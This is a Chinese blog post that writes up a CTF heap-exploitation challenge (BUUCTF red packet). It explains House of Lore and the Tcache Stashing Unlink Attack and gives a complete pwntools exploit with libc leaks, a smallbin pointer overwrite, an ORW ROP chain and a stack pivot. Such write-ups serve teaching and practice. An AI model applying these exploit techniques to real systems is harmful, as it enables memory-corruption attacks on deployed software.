<!DOCTYPE html><html lang="zh-CN" theme-mode="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>House of Lore | Ky不是枕木</title><link rel="icon" type="image/x-icon" href="/favicon.ico"><script>var config = {"root":"/","search":{"preload":false,"activeHolder":"Enter here","blurHolder":"Search","noResult":"Data \"$0\" not found"},"code":{"codeInfo":"$0 - $1 lines","copy":"code.copy","copyFinish":"code.copyFinish","expand":"code.expand"}}</script><script src="//unpkg.com/mermaid@9.2.2/dist/mermaid.min.js"></script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/css/all.min.css"><link rel="stylesheet" href="/css/arknights.css"><script>if (window.localStorage.getItem('theme-mode') === 'light')
 document.documentElement.setAttribute('theme-mode', 'light')
if (window.localStorage.getItem('theme-mode') === 'dark')
 document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
 font-family: Bender;
 src: local('Bender'), url("/font/Bender.ttf"), url("/font/Bender.otf");
}
@font-face {
 font-family: BenderLight;
 src: local('BenderLight'), url("/font/BenderLight.ttf");
}
@font-face {
 font-family: 'JetBrains Mono';
 src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
}</style><style>:root {
  --dark-background: url('https://ak.hypergryph.com/assets/index/images/ak/pc/bk.jpg');
  --light-background: url('/img/bk.jpg');
}</style><meta name="generator" content="Hexo 6.3.0">
<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
<link rel="alternate" href="/atom.xml" title="Ky不是枕木" type="application/atom+xml">
</head><body><div class="loading" style="opacity: 0;"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><div class="navBtn"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><nav><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="Search" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li></ol></nav></header><article><div id="post-bg"><div id="post-title"><h1>House of Lore</h1><div id="post-info"><span>First Post: <div class="control"><time datetime="2023-04-10T15:14:29.000Z" id="date"> 2023-04-10</time></div></span><br><span>Last Update: <div class="control"><time datetime="2023-09-12T08:56:19.407Z" id="updated"> 2023-09-12</time></div></span></div></div><hr><div id="post-content"><p>如果从fastbins中malloc-一个freechunk时，glibc会做以下两个检测：</p>
<p><strong>Tcache Stashing Unlink Attack利用了House of Lore的一些手段，两者都是利用了small bin</strong></p>
<h1 id="House-of-Lore"><a href="#House-of-Lore" class="headerlink" title="House of Lore"></a>House of Lore</h1><blockquote>
<p>House of Lore 攻击与 Glibc 堆管理中的 Small Bin 的机制紧密相关。<br>House of Lore 可以实现分配任意指定位置的 chunk，从而修改任意地址的内存。<br>House of Lore 利用的前提是需要控制 Small Bin Chunk 的 bk 指针，并且控制指定位置 chunk 的 fd 指针。</p>
</blockquote>
<h1 id="Tcache-Stashing-Unlink-Attack"><a href="#Tcache-Stashing-Unlink-Attack" class="headerlink" title="Tcache Stashing Unlink Attack"></a>Tcache Stashing Unlink Attack</h1><blockquote>
<p>利用特性：<br>1.tcache bin中有剩余（数量小于TCACHE_MAX_BINS）时，同大小的small bin会放进tcache中<br>2.calloc函数分配堆块时不从tcache bin中选取。<br>3.修改一个small bin的bk指针时，就可以实现在任意地址上写一个libc地址，构造得当可以往任意地址申请chunk，实现任意地址写</p>
</blockquote>
<p>利用前提</p>
<pre><code>1.能控制 Small Bin Chunk 的 bk 指针。

2.程序可以越过Tache取Chunk。(使用calloc即可做到)

3.程序至少可以分配两种不同大小且大小为unsorted bin的Chunk。
</code></pre>
<h1 id="例题-BUUCTF-2020-新春红包题-3"><a href="#例题-BUUCTF-2020-新春红包题-3" class="headerlink" title="例题 BUUCTF-[2020 新春红包题]3"></a>例题 BUUCTF-[2020 新春红包题]3</h1><p class='item-img' data-src='https://img-blog.csdnimg.cn/1e5652dfa82c4d62aa48c5dfde30cbd7.png?ynotemdtimestamp=1663776368288'><img src="https://img-blog.csdnimg.cn/1e5652dfa82c4d62aa48c5dfde30cbd7.png?ynotemdtimestamp=1663776368288" alt="在这里插入图片描述"><br>未开启canary保护，可能存在栈溢出</p>
<h2 id="main函数"><a href="#main函数" class="headerlink" title="main函数"></a>main函数</h2><p>程序实现四个功能，增，删，查，改，还有一个栈溢出的函数</p>
<pre><code>void __fastcall __noreturn main(char *a1, char **a2, char **a3)
{
  char v3[268]; // [rsp+0h] [rbp-110h] BYREF
  int v4; // [rsp+10Ch] [rbp-4h]

  v4 = 0;
  sub_11D5();
  sub_1450();
  sub_1269();
  while ( 1 )
  {
    while ( 1 )
    {
      while ( 1 )
      {
        menu();
        v4 = readd();
        if ( v4 != 3 )
          break;
        a1 = v3;
        edit(v3, a2);
      }
      if ( v4 &gt; 3 )
        break;
      if ( v4 == 1 )
      {
        if ( x1c &lt;= 0 )
          exitt();
        a1 = v3;
        add(v3);
        --x1c;
      }
      else
      {
        if ( v4 != 2 )
          goto LABEL_19;
        a1 = v3;
        delete(v3);
      }
    }
    if ( v4 == 5 )
      exitt();
    if ( v4 &lt; 5 )
    {
      a1 = v3;
      show(v3);
    }
    else
    {
      if ( v4 != 666 )
LABEL_19:
        exitt();
      stack_attack(a1, a2);
    }
  }
}
</code></pre>
<h2 id="add函数"><a href="#add函数" class="headerlink" title="add函数"></a>add函数</h2><p>申请chunk，会指定chunk的序号，最大为16，且只能申请四种chunk，1.0x10 2.0xf0 3.0x300 4.0x400，并且是calloc函数分配堆块，chunk不会从tcache bin中取。</p>
<pre><code>int __fastcall sub_1515(__int64 a1)
{
  int v2; // [rsp+10h] [rbp-20h]
  int v3; // [rsp+14h] [rbp-1Ch]
  unsigned int v4; // [rsp+18h] [rbp-18h]
  int size; // [rsp+1Ch] [rbp-14h]

  printf("Please input the red packet idx: ");
  v4 = readd();
  if ( v4 &gt; 0x10 )
    exitt();
  printf("How much do you want?(1.0x10 2.0xf0 3.0x300 4.0x400): ");
  v3 = readd();
  if ( v3 == 2 )
  {
    size = 0xF0;
  }
  else if ( v3 &gt; 2 )
  {
    if ( v3 == 3 )
    {
      size = 0x300;
    }
    else
    {
      if ( v3 != 4 )
        goto LABEL_14;
      size = 0x400;
    }
  }
  else
  {
    if ( v3 != 1 )
    {
LABEL_14:
      size = 0;
      goto LABEL_15;
    }
    size = 16;
  }
LABEL_15:
  if ( size != 0x10 &amp;&amp; size != 0xF0 &amp;&amp; size != 0x300 &amp;&amp; size != 0x400 )
    exitt();
  *(16LL * v4 + a1) = calloc(1uLL, size);
  *(a1 + 16LL * v4 + 8) = size;
  printf("Please input content: ");
  v2 = read(0, *(16LL * v4 + a1), *(16LL * v4 + a1 + 8));
  if ( v2 &lt;= 0 )
    exitt();
  *(v2 - 1LL + *(16LL * v4 + a1)) = 0;
  return puts("Done!");
}
</code></pre>
<h2 id="delete函数"><a href="#delete函数" class="headerlink" title="delete函数"></a>delete函数</h2><p>存在UAF</p>
<pre><code>int __fastcall delete(__int64 a1)
{
  unsigned int v2; // [rsp+1Ch] [rbp-4h]

  printf("Please input the red packet idx: ");
  v2 = readd();
  if ( v2 &gt; 0x10 || !*(16LL * v2 + a1) )
    exitt();
  free(*(16LL * v2 + a1));                      // uaf
                                                // 
  return puts("Done!");
}
</code></pre>
<h2 id="edit函数"><a href="#edit函数" class="headerlink" title="edit函数"></a>edit函数</h2><p>编辑的次数受qword_4010控制，qword_4010为1，只能编辑1次</p>
<pre><code>int __fastcall sub_1740(__int64 a1, __int64 a2)
{
  void *v2; // rsi
  int v4; // [rsp+18h] [rbp-8h]
  unsigned int v5; // [rsp+1Ch] [rbp-4h]

  if ( qword_4010 &lt;= 0 )
    exitt(a1, a2);
  --qword_4010;
  printf("Please input the red packet idx: ");
  v5 = readd();
  if ( v5 &gt; 0x10 || !*(16LL * v5 + a1) )
    exitt("Please input the red packet idx: ", a2);
  printf("Please input content: ");
  v2 = *(16LL * v5 + a1);
  v4 = read(0, v2, *(16LL * v5 + a1 + 8));
  if ( v4 &lt;= 0 )
    exitt(0LL, v2);
  *(v4 - 1LL + *(16LL * v5 + a1)) = 0;
  return puts("Done!");
}
</code></pre>
<p class='item-img' data-src='https://img-blog.csdnimg.cn/01aa83610d4643709ea878d55a3f47e1.png?ynotemdtimestamp=1663776368288'><img src="https://img-blog.csdnimg.cn/01aa83610d4643709ea878d55a3f47e1.png?ynotemdtimestamp=1663776368288" alt="在这里插入图片描述"></p>
<h2 id="show函数"><a href="#show函数" class="headerlink" title="show函数"></a>show函数</h2><pre><code>int __fastcall sub_184E(__int64 a1)
{
  unsigned int v2; // [rsp+1Ch] [rbp-4h]

  printf("Please input the red packet idx: ");
  v2 = readd();
  if ( v2 &gt; 0x10 || !*(16LL * v2 + a1) )
    exitt();
  puts(*(16LL * v2 + a1));
  return puts("Done!");
}
</code></pre>
<h2 id="栈溢出函数"><a href="#栈溢出函数" class="headerlink" title="栈溢出函数"></a>栈溢出函数</h2><p>执行栈溢出函数需要满足*(first_chunk + 2048)&gt; 0x7F0000000000且*(first_chunk + 2040) 和 *(first_chunk + 2056)值为0。first_chunk就是我们申请的第一个chunk。</p>
<pre><code>ssize_t sub_13BD()
{
  char buf[128]; // [rsp+0h] [rbp-80h] BYREF

  if ( *(first_chunk + 2048) &lt;= 0x7F0000000000LL || *(first_chunk + 2040) || *(first_chunk + 2056) )
    exitt();
  puts("You get red packet!");
  printf("What do you want to say?");
  return read(0, buf, 0x90uLL);
}
</code></pre>
<h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><p>因为存在一个栈溢出的漏洞，我们可以使用堆ROP，而要想利用栈溢出漏洞需要将*(first_chunk + 2048)修改为一个大于0x7F0000000000的值，而*(first_chunk + 2040)和 *(first_chunk + 2056)本来就是0，保持不变即可。calloc函数分配堆块，chunk不会从tcache bin中取。程序至少可以分配两种不同大小且大小为unsorted bin的Chunk（0x300和0x400）。这里我们可以使用Tcache Stashing Unlink Attack。</p>
<h1 id="调试过程"><a href="#调试过程" class="headerlink" title="调试过程"></a>调试过程</h1><p>先把前面的写好</p>
<pre><code># coding=utf-8
from pwn import *
context(endian='little',os='linux',arch='amd64',log_level='debug') 

sh = process('./RedPacket_SoEasyPwn1')
#sh = remote('node4.buuoj.cn','27283')

libc=ELF("./libc-2.29.so")

 
 

s       = lambda data               :sh.send(data)
sa      = lambda delim,data         :sh.sendafter(delim, data)
sl      = lambda data               :sh.sendline(data)
sla     = lambda delim,data         :sh.sendlineafter(delim, data)
r       = lambda num=4096           :sh.recv(num)
ru      = lambda delims		    :sh.recvuntil(delims)
itr     = lambda                    :sh.interactive()
uu32    = lambda data               :u32(data.ljust(4,'\0'))
uu64    = lambda data               :u64(data.ljust(8,'\0'))
leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))
lg      = lambda address,data       :log.success('%s: '%(address)+hex(data))
def dbg():
        gdb.attach(sh)
        pause()
 

def add(index,chunk_size_index,value):
    ru('Your input: ')
    sl('1')
    ru('Please input the red packet idx: ')
    sl(str(index))
    ru('How much do you want?(1.0x10 2.0xf0 3.0x300 4.0x400): ')
    sl(str(chunk_size_index))
    ru('Please input content: ')
    sl(value)

def free(index):
    ru('Your input: ')
    sl('2')
    ru('Please input the red packet idx: ')
    sl(str(index))

def edit(index,value):
    ru('Your input: ')
    sl('3')
    ru('Please input the red packet idx: ')
    sl(str(index))
    ru('Please input content: ')
    sl(value)

def show(index):
    ru('Your input: ')
    sl('4')
    ru('Please input the red packet idx: ')
    sl(str(index))
</code></pre>
<h2 id="构造tcache-bin"><a href="#构造tcache-bin" class="headerlink" title="构造tcache bin"></a>构造tcache bin</h2><p>首先我们要获得unsorted bin的chunk，需要先填满0x400大小的tcache bin，填0x300大小的tcache bin只剩1个</p>
<pre><code>#1.0x10 2.0xf0 3.0x300 4.0x400
for i in range(7):
    add(15,4,'Chunk_15')
    free(15)

for i in range(6):
    add(14,2,'Chunk_14')
    free(14)

dbg()
</code></pre>
<p class='item-img' data-src='https://img-blog.csdnimg.cn/c84cb045a70c47868706c89a5ffab3a4.png?ynotemdtimestamp=1663776368288'><img src="https://img-blog.csdnimg.cn/c84cb045a70c47868706c89a5ffab3a4.png?ynotemdtimestamp=1663776368288" alt="在这里插入图片描述"><br>此时我们利用UAF可以泄露出heap地址</p>
<pre><code>show(15)
last_chunk_addr = u64(ru('\x0A').strip('\x0A').ljust(8,'\x00'))
lg('last_chunk_addr',last_chunk_addr)
heap_addr = last_chunk_addr - 0x26C0
lg('heap_addr',heap_addr)
dbg()
</code></pre>
<p class='item-img' data-src='https://img-blog.csdnimg.cn/58412fdbeaef4e3db7f7166362a15ab9.png?ynotemdtimestamp=1663776368288'><img src="https://img-blog.csdnimg.cn/58412fdbeaef4e3db7f7166362a15ab9.png?ynotemdtimestamp=1663776368288" alt="在这里插入图片描述"></p>
<h2 id="利用unsorted-bin构造两个small-bin-chunk"><a href="#利用unsorted-bin构造两个small-bin-chunk" class="headerlink" title="利用unsorted bin构造两个small bin chunk"></a>利用unsorted bin构造两个small bin chunk</h2><blockquote>
<p>当我们申请一个chunk时，如果unsorted bin里有chunk，而我们所申请的chunk大小小于unsorted bin里的chunk，那么就把unsorted bin的chunk分割，拿出我们需要的大小申请chunk，剩下的继续留在unsorted bin中，<br>而如果我们申请的chunk大小大于unsorted bin中的chunk，那么就会把unsorted bin中的chunk，按照大小放入对应的bin中，之后再从top chunk中申请一个chunk。</p>
</blockquote>
<p>我们可以先申请一个0x400大小的chunk，再申请一个0x300大小的chunk（防止合并），之后free 大小为0x400的chunk，再申请两次0x300大小的chunk，第一次申请的chunk会从0x400大小的chunk里切割出0x300，unsorted bin还剩0x100大小的chunk，第二次申请的chunk由于大于unsorted bin中的chunk，会将unsorted bin中的0x100大小的chunk放进small bin，我们利用同样的方法可以再次得到一个small bin的chunk，这样我们就得到了两个small bin chunk。</p>
<p>申请一个0x400大小的chunk，再申请一个0x300大小的chunk（防止合并），可以看到tcachebin中的chunk没有被拿走。</p>
<pre><code>add(1,4,'Chunk_1')
add(13,3,'Chunk_13')

dbg()
</code></pre>
<p class='item-img' data-src='https://img-blog.csdnimg.cn/4bc407062a4647f0ab2256d8f7547c82.png?ynotemdtimestamp=1663776368288'><img src="https://img-blog.csdnimg.cn/4bc407062a4647f0ab2256d8f7547c82.png?ynotemdtimestamp=1663776368288" alt="在这里插入图片描述"><br>我们free chunk1，因为chunk1大小为0x400，tcachebin中0x400大小的chunk已满了7个，所以进入unsorted bin，利用UAF泄露libc基地址</p>
<pre><code>free(1)
show(1)
libc_base = u64(ru('\x0A').strip('\x0A').ljust(8,'\x00')) - 0x1E4CA0
lg('libc_base',libc_base)
dbg()
</code></pre>
<p class='item-img' data-src='https://img-blog.csdnimg.cn/6136120230264abc9181165746e485f1.png?ynotemdtimestamp=1663776368288'><img src="https://img-blog.csdnimg.cn/6136120230264abc9181165746e485f1.png?ynotemdtimestamp=1663776368288" alt="在这里插入图片描述"><br>申请0x300大小的chunk，在unsortedbin里寻找大小为0x300的chunk，分割unsortedbin 里的chunk，拿出0x300，还剩0x100</p>
<pre><code>add(13,3,'Chunk_13')
dbg()
</code></pre>
<p class='item-img' data-src='https://img-blog.csdnimg.cn/beb46b48f5e84c63bcd8d4825b23d04b.png?ynotemdtimestamp=1663776368288'><img src="https://img-blog.csdnimg.cn/beb46b48f5e84c63bcd8d4825b23d04b.png?ynotemdtimestamp=1663776368288" alt="在这里插入图片描述"></p>
<p>在unsortedbin里寻找大小为0x300的chunk，此时unsortedbin中chunk只有0x100大小，0x100的chunk进入smallbin，从top chunk中分配0x300大小的chunk，成功制造一个small bin chunk</p>
<pre><code>add(13,3,'Chunk_13')

dbg()
</code></pre>
<p class='item-img' data-src='https://img-blog.csdnimg.cn/e93cba834b9e405d828b6a1a0bbc1ea9.png?ynotemdtimestamp=1663776368288'><img src="https://img-blog.csdnimg.cn/e93cba834b9e405d828b6a1a0bbc1ea9.png?ynotemdtimestamp=1663776368288" alt="在这里插入图片描述"><br>利用同样方法再构造一个small bin chunk</p>
<pre><code>add(2,4,'Chunk_2')
add(13,4,'Chunk_13')

#dbg()

free(2)

#dbg()

add(13,3,'Chunk_13')
add(13,3,'Chunk_13')

dbg()
</code></pre>
<p class='item-img' data-src='https://img-blog.csdnimg.cn/b555f84d5da64f6d800060cc087cc9f6.png?ynotemdtimestamp=1663776368288'><img src="https://img-blog.csdnimg.cn/b555f84d5da64f6d800060cc087cc9f6.png?ynotemdtimestamp=1663776368288" alt="在这里插入图片描述"></p>
<p>并借此我们找到size大小为0x1010的就是first_chunk，借此我们算出刚刚泄露出的heap+ 0x250+0x10+0x800-0x10就是first_chunk+0x800的地址，small bin chunk2的fd指针指向small bin chunk1不变，所以我们还要算出small bin chunk1距离heap的距离0x37e0</p>
<h2 id="修改small-bin-chunk的bk指针为first-chunk-0x800"><a href="#修改small-bin-chunk的bk指针为first-chunk-0x800" class="headerlink" title="修改small bin chunk的bk指针为first_chunk+0x800"></a>修改small bin chunk的bk指针为first_chunk+0x800</h2><pre><code>payload='\x00'*0x300+p64(0)+p64(0x101)+p64(heap_addr+0x37E0)+p64(heap_addr+0x250+0x10+0x800-0x10)
edit(2,payload)
dbg()
</code></pre>
<p class='item-img' data-src='https://img-blog.csdnimg.cn/0812f3a1c86243a681acb859b56aebbb.png?ynotemdtimestamp=1663776368288'><img src="https://img-blog.csdnimg.cn/0812f3a1c86243a681acb859b56aebbb.png?ynotemdtimestamp=1663776368288" alt="在这里插入图片描述"><br>再次申请0x100大小的chunk，程序仅会检查Chunk2的fd指针是否指向Chunk1，在取出Chunk1后，因为0x100的Tcache Bin还有1个空位，程序会遍历发现Chunk2满足大小条件并将其放入Tcache Bin中，我们若此时篡改Chunk2的bk指针指向first_chunk+0x800，触发Tcache Stashing Unlink Attack将main_arena+336写入first_chunk+0x800，满足first_chunk+0x800大于0x7F0000000000.</p>
<p class='item-img' data-src='https://img-blog.csdnimg.cn/c622ed9425cb4e63a1527f1b98668250.png?ynotemdtimestamp=1663776368288'><img src="https://img-blog.csdnimg.cn/c622ed9425cb4e63a1527f1b98668250.png?ynotemdtimestamp=1663776368288" alt="在这里插入图片描述"></p>
<h2 id="构造ORW的ROP链放入堆块中"><a href="#构造ORW的ROP链放入堆块中" class="headerlink" title="构造ORW的ROP链放入堆块中"></a>构造ORW的ROP链放入堆块中</h2><p>先获取一些gadget段， file_name_addr是我们要申请的下一个chunk的mem地址，也就是当前的top chunk的mem地址，距离heap 0x0000000000004A40</p>
<pre><code>pop_rdi_ret = libc_base + 0x0000000000026542
pop_rsi_ret = libc_base + 0x0000000000026f9e
pop_rdx_ret = libc_base + 0x000000000012bda6
file_name_addr = heap_addr + 0x0000000000004A40 #下一个chunk的mem位置起始位置
flag_addr = file_name_addr + 0x0000000000000200 #将flag写到file_name_addr + 0x0000000000000200处，防止覆盖掉有用内容
ROP_chain  = '/flag\x00\x00\x00'
</code></pre>
<p>open(file_name_addr,0)</p>
<pre><code>ROP_chain += p64(pop_rdi_ret)
ROP_chain += p64(file_name_addr)
ROP_chain += p64(pop_rsi_ret)
ROP_chain += p64(0)
ROP_chain += p64(libc_base+libc.symbols['open'])
</code></pre>
<p>read(3,flag_addr,0x40)<br>Read函数的第一个参数文件描述符从0开始累加，<br>程序进行时内核会自动打开3个文件描述符，0，1，2，分别对应，标准输入、输出和出错，<br>这样在程序中，每打开一个文件，文件描述符值从3开始累加。<br>我们打开了一个file_name_addr文件，文件描述符就变为了3，3就代表了file_name_addr文件<br>read函数第一个参数是3，就是在这个文件里读取数据。</p>
<pre><code>ROP_chain += p64(pop_rdi_ret)
ROP_chain += p64(3)
ROP_chain += p64(pop_rsi_ret)
ROP_chain += p64(flag_addr)
ROP_chain += p64(pop_rdx_ret)
ROP_chain += p64(0x40)
ROP_chain += p64(libc_base+libc.symbols['read'])
</code></pre>
<p>write(1,flag_addr,0x40)</p>
<pre><code>ROP_chain += p64(pop_rdi_ret)
ROP_chain += p64(1)
ROP_chain += p64(pop_rsi_ret)
ROP_chain += p64(flag_addr)
ROP_chain += p64(pop_rdx_ret)
ROP_chain += p64(0x40)
ROP_chain += p64(libc_base+libc.symbols['write'])
</code></pre>
<p>申请chunk，将ROP链写到chunk里</p>
<pre><code>add(4,4,ROP_chain)

dbg()
</code></pre>
<p class='item-img' data-src='https://img-blog.csdnimg.cn/b613b47921cb452786368b3e600ad61f.png?ynotemdtimestamp=1663776368288'><img src="https://img-blog.csdnimg.cn/b613b47921cb452786368b3e600ad61f.png?ynotemdtimestamp=1663776368288" alt="在这里插入图片描述"></p>
<h2 id="栈迁移"><a href="#栈迁移" class="headerlink" title="栈迁移"></a>栈迁移</h2><p>利用read(0, buf, 0x90uLL);buf0x80字节，正好可以溢出0x10字节，进行栈迁移，将程序迁移到我们最新申请的chunk处执行我们的ROP链。<br class='item-img' data-src='https://img-blog.csdnimg.cn/a332540cc3894122be74f0675a766eff.png?ynotemdtimestamp=1663776368288'><img src="https://img-blog.csdnimg.cn/a332540cc3894122be74f0675a766eff.png?ynotemdtimestamp=1663776368288" alt="在这里插入图片描述"></p>
<pre><code>leave_ret = libc_base + 0x0000000000058373
ru('Your input: ')
sl('666')
ru('What do you want to say?')
#栈迁移
sl('A'*0x80 + p64(file_name_addr) + p64(leave_ret))

itr()
</code></pre>
<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><pre><code># coding=utf-8
from pwn import *
context(endian='little',os='linux',arch='amd64',log_level='debug') 

sh = process('./RedPacket_SoEasyPwn1')
#sh = remote('node4.buuoj.cn','27283')

libc=ELF("./libc-2.29.so")

 
 

s       = lambda data               :sh.send(data)
sa      = lambda delim,data         :sh.sendafter(delim, data)
sl      = lambda data               :sh.sendline(data)
sla     = lambda delim,data         :sh.sendlineafter(delim, data)
r       = lambda num=4096           :sh.recv(num)
ru      = lambda delims		    :sh.recvuntil(delims)
itr     = lambda                    :sh.interactive()
uu32    = lambda data               :u32(data.ljust(4,'\0'))
uu64    = lambda data               :u64(data.ljust(8,'\0'))
leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))
lg      = lambda address,data       :log.success('%s: '%(address)+hex(data))
def dbg():
        gdb.attach(sh)
        pause()
 

def add(index,chunk_size_index,value):
    ru('Your input: ')
    sl('1')
    ru('Please input the red packet idx: ')
    sl(str(index))
    ru('How much do you want?(1.0x10 2.0xf0 3.0x300 4.0x400): ')
    sl(str(chunk_size_index))
    ru('Please input content: ')
    sl(value)

def free(index):
    ru('Your input: ')
    sl('2')
    ru('Please input the red packet idx: ')
    sl(str(index))

def edit(index,value):
    ru('Your input: ')
    sl('3')
    ru('Please input the red packet idx: ')
    sl(str(index))
    ru('Please input content: ')
    sl(value)

def show(index):
    ru('Your input: ')
    sl('4')
    ru('Please input the red packet idx: ')
    sl(str(index))


 

#1.0x10 2.0xf0 3.0x300 4.0x400
for i in range(7):
    add(15,4,'Chunk_15')
    free(15)



for i in range(6):
    add(14,2,'Chunk_14')
    free(14)

#dbg()

show(15)
last_chunk_addr = u64(ru('\x0A').strip('\x0A').ljust(8,'\x00'))
lg('last_chunk_addr',last_chunk_addr)
heap_addr = last_chunk_addr - 0x26C0
lg('heap_addr',heap_addr)

#dbg()

add(1,4,'Chunk_1')
add(13,3,'Chunk_13')

#dbg()

free(1)
show(1)
libc_base = u64(ru('\x0A').strip('\x0A').ljust(8,'\x00')) - 0x1E4CA0
lg('libc_base',libc_base)


#dbg()

#在unsortedbin里寻找大小为0x300的chunk，分割unsortedbin 里的chunk，拿出0x300，还剩0x100
add(13,3,'Chunk_13')


#dbg()

#在unsortedbin里寻找大小为0x300的chunk，此时unsortedbin中chunk只有0x100大小，0x100的chunk进入smallbin，从top chunk中分配0x300大小的chunk
add(13,3,'Chunk_13')

#dbg()

#在申请一个0x400大小的chunk，再制造一个0x100的smallbin的chunk
add(2,4,'Chunk_2')
#申请一个chunk防止合并
add(13,4,'Chunk_13')

#dbg()

free(2)

#dbg()

add(13,3,'Chunk_13')
add(13,3,'Chunk_13')

#dbg()

payload='\x00'*0x300+p64(0)+p64(0x101)+p64(heap_addr+0x37E0)+p64(heap_addr+0x250+0x10+0x800-0x10)
edit(2,payload)

#dbg()

add(3,2,'Chunk_3')
lg('heap_addr',heap_addr)

#dbg()

#ORW
pop_rdi_ret = libc_base + 0x0000000000026542
pop_rsi_ret = libc_base + 0x0000000000026f9e
pop_rdx_ret = libc_base + 0x000000000012bda6
file_name_addr = heap_addr + 0x0000000000004A40 #下一个chunk的mem位置起始位置
flag_addr = file_name_addr + 0x0000000000000200 #将flag写到file_name_addr + 0x0000000000000200处，防止覆盖掉有用内容
ROP_chain  = '/flag\x00\x00\x00'
#open(file_name_addr,0)
ROP_chain += p64(pop_rdi_ret)
ROP_chain += p64(file_name_addr)
ROP_chain += p64(pop_rsi_ret)
ROP_chain += p64(0)
ROP_chain += p64(libc_base+libc.symbols['open'])
#read(3,flag_addr,0x40)
#Read函数的第一个参数文件描述符从0开始累加，
#程序进行时内核会自动打开3个文件描述符，0，1，2，分别对应，标准输入、输出和出错，
#这样在程序中，每打开一个文件，文件描述符值从3开始累加。
#我们打开了一个file_name_addr文件，文件描述符就变为了3，3就代表了file_name_addr文件
#read函数第一个参数是3，就是在这个文件里读取数据。
ROP_chain += p64(pop_rdi_ret)
ROP_chain += p64(3)
ROP_chain += p64(pop_rsi_ret)
ROP_chain += p64(flag_addr)
ROP_chain += p64(pop_rdx_ret)
ROP_chain += p64(0x40)
ROP_chain += p64(libc_base+libc.symbols['read'])
#write(1,flag_addr,0x40)
ROP_chain += p64(pop_rdi_ret)
ROP_chain += p64(1)
ROP_chain += p64(pop_rsi_ret)
ROP_chain += p64(flag_addr)
ROP_chain += p64(pop_rdx_ret)
ROP_chain += p64(0x40)
ROP_chain += p64(libc_base+libc.symbols['write'])

add(4,4,ROP_chain)

#dbg()

leave_ret = libc_base + 0x0000000000058373
ru('Your input: ')
sl('666')
ru('What do you want to say?')
#栈迁移
sl('A'*0x80 + p64(file_name_addr) + p64(leave_ret))

#dbg()
itr()
</code></pre>
<div id="paginator"></div></div><div id="post-footer"><div id="pages"><div class="footer-link" style="width: 50%;text-align:right;border-right:1px #fe2 solid"><a href="/2023/04/10/House%20of%20Force2/">← Next House of Force2</a></div><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2023/04/10/House%20of%20Spirit/">House of Spirit Prev →</a></div></div></div></div><div class="bottom-btn"><div><a class="i-top" id="to-top" onClick="scrolls.scrolltop();" title="To Top" style="opacity: 0; display: none;">∧ </a><a class="i-index" id="to-index" href="#toc-div" title="To Catalog">≡</a><a class="i-color" id="color-mode" onClick="colorMode.change()" title="Change Theme"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="https://ak.hypergryph.com/assets/index/images/ak/pc/faction/1.png" alt="Logo"></a><h1 id="Dr"><a href="/">枕木</a></h1><div id="description"><p>当你觉得生活都不顺心如意的时候，来学习pwn吧！</p></div></div><div id="aside-block"><div id="toc-div"><h1>Catalog</h1><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#House-of-Lore"><span class="toc-number">1.</span> <span class="toc-text">House of Lore</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Tcache-Stashing-Unlink-Attack"><span class="toc-number">2.</span> <span class="toc-text">Tcache Stashing Unlink Attack</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98-BUUCTF-2020-%E6%96%B0%E6%98%A5%E7%BA%A2%E5%8C%85%E9%A2%98-3"><span class="toc-number">3.</span> <span class="toc-text">例题 BUUCTF-[2020 新春红包题]3</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#main%E5%87%BD%E6%95%B0"><span class="toc-number">3.1.</span> <span class="toc-text">main函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#add%E5%87%BD%E6%95%B0"><span class="toc-number">3.2.</span> <span class="toc-text">add函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#delete%E5%87%BD%E6%95%B0"><span class="toc-number">3.3.</span> <span class="toc-text">delete函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#edit%E5%87%BD%E6%95%B0"><span class="toc-number">3.4.</span> <span class="toc-text">edit函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#show%E5%87%BD%E6%95%B0"><span class="toc-number">3.5.</span> <span class="toc-text">show函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" 